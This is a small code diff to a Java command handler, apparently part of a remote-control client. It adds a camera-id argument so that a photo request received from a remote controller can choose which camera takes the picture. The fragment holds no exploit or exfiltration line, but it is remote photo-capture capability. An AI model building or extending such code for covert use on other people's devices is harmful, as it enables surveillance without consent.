@@ -128,8 +128,9 @@ public class ProcessCommand
 			client.sendInformation("Photo picture request received");
 			//if(client instanceof Client)
 			//	client.sendError("Photo requested from a service (it will probably not work)");
+			long camid = arguments.getLong();
 			client.photoTaker = new PhotoTaker(client, chan);
-			if (!client.photoTaker.takePhoto())
+			if (!client.photoTaker.takePhoto(camid))
 				client.sendError("Something went wrong while taking the picture");
 			
 		} else if (commande == Protocol.DO_TOAST)
